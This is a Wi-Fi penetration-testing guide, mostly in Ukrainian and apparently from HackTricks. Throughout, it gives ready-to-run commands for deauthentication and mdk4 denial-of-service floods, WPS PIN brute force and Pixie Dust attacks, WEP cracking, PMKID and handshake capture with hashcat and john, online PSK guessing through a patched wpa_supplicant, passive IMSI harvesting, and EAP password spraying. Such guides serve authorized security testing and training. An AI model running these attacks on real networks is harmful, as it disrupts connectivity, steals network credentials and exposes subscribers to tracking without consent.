# Pentesting Wifi

{{#include ../../banners/hacktricks-training.md}}

## Wifi базові команди
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Інструменти

### Hijacker & NexMon (вбудований Wi-Fi Android)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Запустити airgeddon за допомогою docker**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
From: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Може виконувати атаки Evil Twin, KARMA та Known Beacons, а потім використовувати шаблон phishing для отримання справжнього password мережі або перехоплення social network credentials.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Цей інструмент автоматизує **WPS/WEP/WPA-PSK** атаки. Він автоматично:

- Переведе інтерфейс у monitor mode
- Сканує можливі мережі - і дозволить вам вибрати жертву(и)
- Якщо WEP - запустить WEP атаки
- Якщо WPA-PSK
- Якщо WPS: Pixie dust attack та bruteforce attack (уважно: brute-force attack може зайняти багато часу). Зауважте, що він не пробує null PIN або database/generated PINs.
- Спробує capture PMKID з AP, щоб crack it
- Спробує deauthenticate клієнтів AP, щоб capture handshake
- Якщо PMKID або Handshake, спробує bruteforce, використовуючи top5000 паролів.

## Короткий огляд атак

- **DoS**
- Deauthentication/disassociation -- Відключити всіх (або конкретний ESSID/Client)
- Random fake APs -- Приховати мережі, можливий crash сканерів
- Overload AP -- Спроба вивести AP з ладу (зазвичай не дуже корисно)
- WIDS -- Працювати з IDS
- TKIP, EAPOL -- Деякі специфічні атаки для DoS деяких AP
- **Cracking**
- Crack **WEP** (several tools and methods)
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **WPA handshake** capture + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin** (with or without DoS)
- **Open** Evil Twin \[+ DoS] -- Корисно для capture captive portal creds і/або виконання LAN attacks
- **WPA-PSK** Evil Twin -- Корисно для мережевих атак, якщо ви знаєте пароль
- **WPA-MGT** -- Корисно для capture company credentials
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- Корисно для capture captive portal creds і/або виконання LAN attacks
- **+ WPA** -- Корисно для capture WPA handshakes

## Open / OWE networks quick notes

- **Passive capture** on open SSIDs still works with monitor mode and tcpdump:
```bash
iw wlan0 set type monitor
ip link set wlan0 up
iw wlan0 set channel 6
tcpdump -i wlan0 -w capture.pcap
```
- **OWE** (Opportunistic Wireless Encryption) виконує обмін ключами для кожної станції (no PSK), тож повітряні кадри шифруються навіть на "open" SSID. Оскільки базується на WPA3, воно також примушує виконання **802.11w PMF**, що блокує підроблені deauth/disassoc frames.
- OWE **не автентифікує** підключення: будь-хто може асоціюватись, тому **перевіряйте ізоляцію клієнтів** замість довіри маркетинговим заявам. Без ізоляції ARP spoofing або responder-style poisoning на локальному L2 усе ще працює.
- **Evil Twin** залишається можливим на open/OWE SSID шляхом подання сильнішого сигналу; PMF лише прибирає деавт-«шорткат». Якщо жертви приймуть підроблений TLS cert, повний HTTP(S) MitM відновлюється.
- Broadcast poisoning на open guest Wi‑Fi легко дає creds/hashes (LLMNR/NBT-NS/mDNS). See:

{{#ref}}
../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## DOS

### Deauthentication Packets

**Опис з** [**here**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deauthentication** атаки, поширений метод у Wi‑Fi hacking, передбачають підробку "management" кадрів, щоб **примусово відключити пристрої від мережі**. Ці нешифровані пакети вводять клієнтів в оману, змушуючи вважати їх від легітимної мережі, що дозволяє нападникам збирати WPA handshakes для cracking або стійко порушувати мережеві з'єднання. Ця тактика, тривожно проста, широко використовується і має суттєві наслідки для безпеки мережі.

**Deauthentication using Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0 означає deauthentication
- 1 — кількість deauths для відправлення (можна відправити кілька, якщо бажаєте); 0 означає відправляти їх безперервно
- -a 00:14:6C:7E:40:80 — MAC address точки доступу (AP)
- -c 00:0F:B5:34:30:30 — MAC address клієнта для deauthenticate; якщо це опущено — надсилається broadcast deauthentication (працює не завжди)
- ath0 — ім'я інтерфейсу

### Disassociation Packets

**Disassociation packets**, схожі на deauthentication packets, є типом керуючого кадру, що використовується у Wi-Fi мережах. Ці пакети розривають з'єднання між пристроєм (наприклад, ноутбуком або смартфоном) та точкою доступу (AP). Головна відмінність між disassociation і deauthentication полягає в сценаріях їх використання. У той час як AP надсилає **deauthentication packets to remove rogue devices explicitly from the network, disassociation packets are typically sent when the AP is undergoing a shutdown**, перезавантаження або переміщення, що вимагає відключення всіх підключених вузлів.

**Цю атаку можна виконати за допомогою mdk4(mode "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Більше DOS-атак від mdk4**

**У** [**here**](https://en.kali.tools/?p=864)**.**

**ATTACK MODE b: Beacon Flooding**

Надсилає beacon frames, щоб показати фальшиві APs клієнтам. Іноді це може призвести до збою сканерів мережі і навіть драйверів!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

Надсилання authentication frames до всіх доступних Access Points (APs) у зоні дії може перевантажити ці APs, особливо коли задіяно велику кількість клієнтів. Такий інтенсивний трафік може спричинити нестабільність системи, через що деякі APs зависають або навіть перезавантажуються.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ATTACK MODE p: SSID Probing and Bruteforcing**

Probing Access Points (APs) перевіряє, чи SSID правильно відображається, і підтверджує радіус дії AP. Ця техніка, у поєднанні з **bruteforcing hidden SSIDs** з або без wordlist, допомагає ідентифікувати та отримати доступ до прихованих мереж.

**ATTACK MODE m: Michael Countermeasures Exploitation**

Відправлення випадкових або дубльованих пакетів у різні черги QoS може спровокувати Michael Countermeasures на **TKIP APs**, що призведе до одномінутного вимкнення AP. Цей метод є ефективною тактикою атаки **DoS** (Denial of Service).
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**РЕЖИМ АТАКИ e: EAPOL Start and Logoff Packet Injection**

Затоплення AP **EAPOL Start frames** призводить до створення **fake sessions**, перевантажуючи AP та блокуючи легітимних клієнтів. Альтернативно, ін'єкція **fake EAPOL Logoff messages** примусово відключає клієнтів; обидва методи ефективно порушують роботу мережі.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: Attacks for IEEE 802.11s mesh networks**

Різні атаки на управління лінками та маршрутизацію в mesh-мережах.

**ATTACK MODE w: WIDS Confusion**

Паралельне підключення клієнтів до кількох WDS-вузлів або фальшивих rogue APs може маніпулювати Intrusion Detection and Prevention Systems, створюючи плутанину та потенційне зловживання системою.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ATTACK MODE f: Packet Fuzzer**

Packet fuzzer, що включає різноманітні джерела пакетів і повний набір модифікаторів для маніпуляцій із пакетами.

### **Airggedon**

_**Airgeddon**_ пропонує більшість атак, запропонованих у попередніх коментарях:

![](<../../images/image (95).png>)

## WPS

WPS (Wi-Fi Protected Setup) спрощує процес підключення пристроїв до роутера, прискорюючи та полегшуючи налаштування для мереж, зашифрованих за допомогою **WPA** або **WPA2** Personal. Він неефективний для легко зламуної **WEP**. WPS використовує 8-значний PIN, який перевіряється у двох частинах, що робить його вразливим до brute-force атак через обмежену кількість комбінацій (близько 11 000 можливостей).

### WPS Bruteforce

Існують 2 основні інструменти для виконання цієї атаки: Reaver та Bully.

- **Reaver** був розроблений як надійний та практичний інструмент атаки на WPS і протестований на великій кількості точок доступу та реалізацій WPS.
- **Bully** — це **нова реалізація** WPS brute force атаки, написана на C. Має кілька переваг над оригінальним reaver code: менше залежностей, краща робота з пам'яттю та cpu, коректне оброблення порядку байтів (endianness) і більш надійний набір опцій.

Атака експлуатує **WPS PIN's vulnerability**, зокрема те, що перші чотири цифри розкриваються, а остання цифра виконує роль контрольної суми, що полегшує brute-force атаку. Проте захисти від brute-force атак, такі як **blocking MAC addresses** агресивних зловмисників, вимагають **MAC address rotation**, щоб продовжити атаку.

Отримавши WPS PIN за допомогою інструментів, таких як Bully або Reaver, зловмисник може визначити WPA/WPA2 PSK, забезпечивши **постійний доступ до мережі**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

Цей вдосконалений підхід націлений на WPS PINs з використанням відомих вразливостей:

1. **Pre-discovered PINs**: Використовуйте базу даних відомих PINs, пов'язану з конкретними виробниками, які відомі застосуванням уніфікованих WPS PINs. Ця база зіставляє перші три октети MAC-addresses з ймовірними PINs для цих виробників.
2. **PIN Generation Algorithms**: Використовуйте алгоритми, такі як ComputePIN та EasyBox, які обчислюють WPS PINs на основі MAC-address AP. Алгоритм Arcadyan додатково вимагає device ID, додаючи шар до процесу генерації PIN.

### WPS Pixie Dust attack

**Dominique Bongard** виявив вразливість в деяких Access Points (APs), що стосується створення секретних кодів, відомих як **nonces** (**E-S1** та **E-S2**). Якщо ці nonces можна визначити, злам WPS PIN пристрою AP стає простим. AP розкриває PIN у спеціальному коді (hash), щоб довести свою легітимність і що він не є підробленим (rogue) AP. Ці nonces по суті є "ключами" для відкриття "сейфу", що містить WPS PIN. Детальніше про це можна знайти [тут](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>).

Простими словами, суть проблеми в тому, що деякі APs не використовували достатньо випадкові ключі для шифрування PIN під час процесу підключення. Це робить PIN вразливим до відгадування з поза мережі (offline brute force attack).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Якщо ви не хочете переключати пристрій у monitor mode, або `reaver` та `bully` мають проблеми, можете спробувати [OneShot-C](https://github.com/nikita-yfh/OneShot-C). Цей інструмент може виконувати Pixie Dust attack без переходу в monitor mode.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin attack

Деякі погано спроєктовані системи навіть дозволяють **Null PIN** (порожній або неіснуючий PIN) надати доступ, що досить незвично. Інструмент **Reaver** здатний перевіряти цю вразливість, на відміну від **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Усі запропоновані WPS-атаки можна легко виконати за допомогою _**airgeddon.**_

![](<../../images/image (219).png>)

- 5 та 6 дозволяють спробувати **ваш власний PIN** (якщо він у вас є)
- 7 та 8 виконують **Pixie Dust attack**
- 13 дозволяє протестувати **NULL PIN**
- 11 та 12 **recollect the PINs related to the selected AP from available databases** та **згенерують** можливі **PINs** за допомогою: ComputePIN, EasyBox і опційно Arcadyan (рекомендовано, чому б ні?)
- 9 та 10 протестують **кожен можливий PIN**

## **WEP**

**Чому він вразливий**

- RC4 seed — це лише **IV (24 bits) + shared key**. IV знаходиться у відкритому тексті, дуже малий (2^24) і швидко повторюється, тому ciphertexts з тим самим IV повторно використовують keystream.
- XORing двох ciphertexts з тим самим keystream leaks `PlaintextA ⊕ PlaintextB`; передбачувані заголовки + RC4 KSA biases (**FMS**) дозволяють «vote» байти ключа. **PTW** оптимізує це, використовуючи ARP traffic, щоб знизити вимоги до десятків тисяч пакетів замість мільйонів.
- Integrity — лише **CRC32** (linear/unkeyed), тому нападник може перевернути біти та перерахувати CRC32 без ключа → packet forgery/replay/ARP injection в очікуванні IV.

Практичний злам є детермінованим:
```bash
airodump-ng --bssid <BSSID> --channel <ch> --write wep_capture wlan1mon  # collect IVs
# optionally speed up IVs without deauth by replaying ARP
aireplay-ng --arpreplay -b <BSSID> -h <clientMAC> wlan1mon
aircrack-ng wep_capture-01.cap  # PTW attack recovers key once IV threshold is met
```
Airgeddon все ще постачається з "All-in-One" WEP workflow, якщо ви віддаєте перевагу guided UI.

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

У 2018 році **hashcat** [revealed](https://hashcat.net/forum/thread-7717.html) описав новий метод атаки, унікальний тим, що йому потрібен лише **один пакет** і він не вимагає підключених клієнтів до цільової AP — достатньо взаємодії між зловмисником і AP.

Багато сучасних маршрутизаторів додають **необов'язкове поле** до **першого EAPOL** фрейму під час асоціації, відоме як `Robust Security Network`. Воно включає `PMKID`.

Як пояснює оригінальний пост, **PMKID** створюється з використанням відомих даних:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Оскільки "PMK Name" є константним, ми знаємо BSSID AP та station, а `PMK` ідентичний тому з повного 4-way handshake, **hashcat** може використати цю інформацію, щоб зламати PSK і відновити passphrase!

Щоб **gather** цю інформацію та локально **bruteforce** пароль, ви можете зробити:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
**PMKIDs captured** будуть показані в **console** і також **saved** всередині \_ **/tmp/attack.pcap**\_\
Тепер конвертуйте захоплення у формат **hashcat/john** і зламайте його:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Зверніть увагу, що формат правильного hash містить **4 частини**, наприклад: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` Якщо ваш **містить лише** **3 частини**, то він є **недійсним** (захоплення PMKID було недійсним).

Зауважте, що `hcxdumptool` **також захоплює handshakes** (з'явиться приблизно таке: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Ви можете **перетворити** ці **handshakes** у формат **hashcat**/**john** за допомогою `cap2hccapx`
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_Я помітив, що деякі handshakes, захоплені цим інструментом, не могли бути cracked навіть при відомому правильному password. Рекомендую, якщо можливо, також захоплювати handshakes традиційним способом або захопити кілька handshakes за допомогою цього інструменту._

### Handshake захоплення

Атака на **WPA/WPA2** мережі може бути виконана шляхом захоплення **handshake** і спроби **crack** пароля **offline**. Цей процес передбачає моніторинг комунікації конкретної мережі і **BSSID** на певному **channel**. Ось стислий посібник:

1. Визначте **BSSID**, **channel**, та **connected client** цільової мережі.
2. Використайте `airodump-ng` для моніторингу трафіку мережі на вказаному **channel** і **BSSID**, у надії захопити **handshake**. Команда виглядатиме так:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Щоб збільшити шанси на захоплення handshake, тимчасово відключіть клієнта від мережі, щоб змусити його повторно аутентифікуватися. Це можна зробити за допомогою команди `aireplay-ng`, яка відправляє deauthentication packets клієнту:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Зверніть увагу, що коли client був deauthenticated, він може спробувати підключитися до іншого AP або, в інших випадках, до іншої мережі._

Якщо в `airodump-ng` з'являється інформація про handshake, це означає, що handshake було захоплено і ви можете припинити прослуховування:

![](<../../images/image (172) (1).png>)

Після того, як handshake захоплено, ви можете **crack** його за допомогою `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Перевірити, чи є handshake у файлі

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Якщо цей інструмент знайде незавершений handshake певного ESSID раніше за завершений, він не виявить дійсний._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
#### Швидше онлайн вгадування PSK через `wpa_supplicant` ctrl socket (no clients/PMKID)

Коли поблизу немає clients і AP відхиляє PMKID, ви можете перебирати PSKs онлайн без перезапуску supplicants:

- Внесіть патч у `wpa_supplicant.c`, щоб примусово встановити `dur = 0;` у логіці backoff при помилці автентифікації (біля `ssid->auth_failures`), що фактично відключає таймер тимчасового відключення.
- Запустіть один демон з control socket:
```bash
# wpa_supplicant.conf
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=root
update_config=1

wpa_supplicant -B -i wlp3s0 -c wpa_supplicant.conf
```
- Керувати ним через інтерфейс управління, повторно використовуючи той самий скан і мережу:
```text
ADD_NETWORK
SET_NETWORK 0 ssid "<ssid>"
ENABLE_NETWORK 0
SCAN
(loop)
SET_NETWORK 0 psk "<candidate>"
REASSOCIATE
wait for CTRL-EVENT-CONNECTED / DISCONNECTED
```
Невеликий цикл на Python, що читає події сокета (`CTRL-EVENT-CONNECTED` / `CTRL-EVENT-DISCONNECTED`), може перевірити ~100 припущень за ~5 хвилин без накладних витрат на сканування. Це все ще шумно й виявляється, але уникає перезапусків процесу для кожної спроби та backoff delays.

## **WPA Enterprise (MGT)**

В **корпоративних WiFi-налаштуваннях ви натрапите на різні методи аутентифікації**, кожен із яких забезпечує різні рівні безпеки та можливості керування. Коли ви використовуєте інструменти на кшталт `airodump-ng` для аналізу мережевого трафіку, ви можете помітити ідентифікатори цих типів аутентифікації. До деяких поширених методів належать:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- Цей метод підтримує апаратні токени та одноразові паролі всередині EAP-PEAP. На відміну від MSCHAPv2, він не використовує peer challenge і надсилає паролі у відкритому вигляді на точку доступу, що створює ризик для downgrade атак.
2. **EAP-MD5 (Message Digest 5)**:
- Передбачає відправку MD5-хешу пароля від клієнта. Його **не рекомендовано** через вразливість до словникових атак, відсутність аутентифікації сервера та неможливість генерувати сесійні WEP keys.
3. **EAP-TLS (Transport Layer Security)**:
- Використовує сертифікати на боці клієнта та сервера для аутентифікації і може динамічно генерувати користувацькі та сесійні WEP keys для захисту зв’язку.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- Забезпечує взаємну аутентифікацію через зашифрований тунель, а також метод для виведення динамічних, per-user, per-session WEP keys. Потребує лише серверних сертифікатів, клієнти використовують облікові дані.
5. **PEAP (Protected Extensible Authentication Protocol)**:
- Працює аналогічно EAP, створюючи TLS-тунель для захищеної передачі. Дозволяє використовувати слабші протоколи аутентифікації поверх EAP завдяки захисту тунелю.
- **PEAP-MSCHAPv2**: Часто називають просто PEAP, поєднує вразливий механізм challenge/response MSCHAPv2 із захисним TLS-тунелем.
- **PEAP-EAP-TLS (or PEAP-TLS)**: Схожий на EAP-TLS, але ініціює TLS-тунель перед обміном сертифікатами, додаючи ще один рівень захисту.

You can find more information about these authentication methods [here ](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol)and [here](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Username Capture

Читаючи [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27), виглядає, що якщо ви використовуєте **EAP**, то **"Identity"** **messages** мають бути **підтримані**, і **username** буде надсилатися у **відкритому вигляді** в **"Response Identity"** повідомленнях.

Навіть використовуючи один із найбільш безпечних методів аутентифікації: **PEAP-EAP-TLS**, можливе **capture the username sent in the EAP protocol**. Для цього **capture a authentication communication** (запустіть `airodump-ng` на каналі і `wireshark` в тому ж інтерфейсі) і відфільтруйте пакети по`eapol`.\
Всередині пакета "**Response, Identity**" з’явиться **username** клієнта.

![](<../../images/image (850).png>)

### Anonymous Identities

Приховування Identity підтримується як EAP-PEAP, так і EAP-TTLS. У контексті WiFi мережі, EAP-Identity запит зазвичай ініціюється точкою доступу (AP) під час процесу асоціації. Щоб забезпечити захист анонімності користувача, відповідь від EAP клієнта на пристрої користувача містить лише мінімальну інформацію, необхідну початковому RADIUS серверу для обробки запиту. Це поняття ілюструється наступними сценаріями:

- EAP-Identity = anonymous
- У цьому сценарії всі користувачі використовують псевдонім "anonymous" як свій ідентифікатор користувача. Початковий RADIUS сервер функціонує як EAP-PEAP або EAP-TTLS сервер, відповідаючи за серверну частину протоколу PEAP або TTLS. Внутрішній (захищений) метод аутентифікації тоді обробляється локально або делегується віддаленому (home) RADIUS серверу.
- EAP-Identity = anonymous@realm_x
- У цій ситуації користувачі з різних realm приховують свої ідентичності, вказуючи лише свої відповідні realm. Це дозволяє початковому RADIUS серверу проксувати EAP-PEAP або EAP-TTLS запити до RADIUS серверів у їхніх home realms, які виступають як PEAP або TTLS сервери. Початковий RADIUS сервер працює виключно як RADIUS relay node.
- Альтернативно, початковий RADIUS сервер може функціонувати як EAP-PEAP або EAP-TTLS сервер і або обробляти захищений метод аутентифікації, або пересилати його на інший сервер. Цей варіант дозволяє налаштовувати відмінні політики для різних realm.

В EAP-PEAP, як тільки TLS-тунель встановлено між PEAP сервером і PEAP клієнтом, PEAP сервер ініціює EAP-Identity запит і передає його через TLS-тунель. Клієнт відповідає на цей другий EAP-Identity запит, надсилаючи EAP-Identity response, що містить справжню ідентичність користувача через зашифрований тунель. Такий підхід ефективно запобігає розкриттю фактичної ідентичності користувача будь-кому, хто прослуховує 802.11 трафік.

EAP-TTLS слідує трохи іншій процедурі. У випадку EAP-TTLS клієнт зазвичай аутентифікується за допомогою PAP або CHAP, захищеними TLS-тунелем. У цьому випадку клієнт включає User-Name атрибут і або Password, або CHAP-Password атрибут у початковому TLS-повідомленні, відправленому після встановлення тунелю.

Незалежно від вибраного протоколу, PEAP/TTLS сервер дізнається справжню ідентичність користувача після встановлення TLS-тунелю. Справжня ідентичність може бути у форматі user@realm або просто user. Якщо PEAP/TTLS сервер також відповідає за аутентифікацію користувача, він тепер має ідентичність користувача і продовжує з методом аутентифікації, захищеним TLS-тунелем. Альтернативно, PEAP/TTLS сервер може переслати новий RADIUS запит на home RADIUS сервер користувача. Цей новий RADIUS запит не містить шару PEAP або TTLS. У випадках, коли захищений метод аутентифікації — EAP, внутрішні EAP повідомлення передаються до home RADIUS сервера без обгортки EAP-PEAP або EAP-TTLS. User-Name атрибут вихідного RADIUS повідомлення містить справжню ідентичність користувача, замінивши anonymous User-Name з вхідного RADIUS запиту. Коли захищений метод аутентифікації — PAP або CHAP (підтримується тільки TTLS), User-Name та інші атрибути аутентифікації, витягнуті з TLS payload, підставляються у вихідному RADIUS повідомленні, заміщаючи anonymous User-Name та TTLS EAP-Message атрибути з вхідного RADIUS запиту.

For more info check [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm)

### SIM-based EAP (EAP-SIM/EAP-AKA) identity leakage (IMSI exposure)

SIM-based Wi‑Fi authentication using EAP‑SIM/EAP‑AKA over 802.1X can leak the permanent subscriber identifier (IMSI) in cleartext during the unauthenticated identity phase if the deployment doesn’t implement pseudonyms/protected identities or a TLS tunnel around the inner EAP.

Where the leak happens (high level):
- 802.11 association completes to the SSID (often carrier offload SSIDs like FreeWifi_secure, eduroam-like operator realms, etc.).
- Authenticator sends EAP-Request/Identity.
- Vulnerable clients answer EAP-Response/Identity with their permanent identity = IMSI encoded as a 3GPP NAI, prior to any protection.
- Example NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
- Anyone passively listening to RF can read that frame. No 4-way handshake or TLS keying is needed.

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>Натисніть, щоб розгорнути</summary>
```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

Примітки:
- Працює до встановлення будь‑якого TLS‑тунелю, якщо розгортання використовує чистий EAP‑SIM/AKA без захищеної ідентичності/псевдонімів.
- Відкрите значення є постійним ідентифікатором, прив'язаним до SIM абонента; його збір дозволяє довготривале відстеження та подальші зловживання в телекомунікаціях.

Вплив
- Privacy: persistent user/device tracking from passive Wi‑Fi captures in public places.
- Telecom abuse bootstrap: with the IMSI, an attacker with SS7/Diameter access can query location or attempt call/SMS interception and MFA theft.

Заходи пом'якшення / на що звертати увагу
- Переконайтесь, що клієнти використовують анонімні зовнішні ідентичності (псевдоніми) для EAP‑SIM/AKA згідно з керівництвом 3GPP (наприклад, 3GPP TS 33.402).
- Віддавати перевагу тунелюванню фази ідентифікації (наприклад, EAP‑TTLS/PEAP з внутрішнім EAP‑SIM/AKA), щоб IMSI ніколи не передавався у відкритому вигляді.
- Пакетні захоплення при асоціації/аутентифікації не повинні розкривати сирий IMSI в EAP-Response/Identity.

Пов'язане: Telecom signalling exploitation with captured mobile identifiers
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

Якщо очікується, що клієнт використовуватиме **username and password** (зверніть увагу, що **EAP-TLS won't be valid** у цьому випадку), то ви можете спробувати отримати **list** **usernames** (див. наступну частину) та **passwords** і спробувати **bruteforce** доступ за допомогою [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Ви також можете виконати цю атаку за допомогою `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Теорія атак на клієнта

### Вибір мережі та роумінг

- Протокол 802.11 визначає, як станція приєднується до Extended Service Set (ESS), але не вказує критерії вибору ESS або access point (AP) у його межах.
- Станції можуть переміщуватися між AP, що використовують один і той же ESSID, підтримуючи зв’язок у будівлі або на певній території.
- Протокол вимагає автентифікації станції до ESS, але не зобов’язує AP проходити автентифікацію до станції.

### Preferred Network Lists (PNLs)

- Станції зберігають ESSID кожної бездротової мережі, до якої вони підключалися, у Preferred Network List (PNL), разом із конфігурацією, специфічною для мережі.
- PNL використовується для автоматичного підключення до відомих мереж, покращуючи досвід користувача шляхом спрощення процесу підключення.

### Passive Scanning

- AP періодично транслюють beacon frames, оголошуючи свою присутність і можливості, включно з ESSID AP, якщо трансляція не вимкнена.
- Під час passive scanning станції слухають beacon frames. Якщо ESSID у beacon збігається з записом у PNL станції, станція може автоматично підключитися до цього AP.
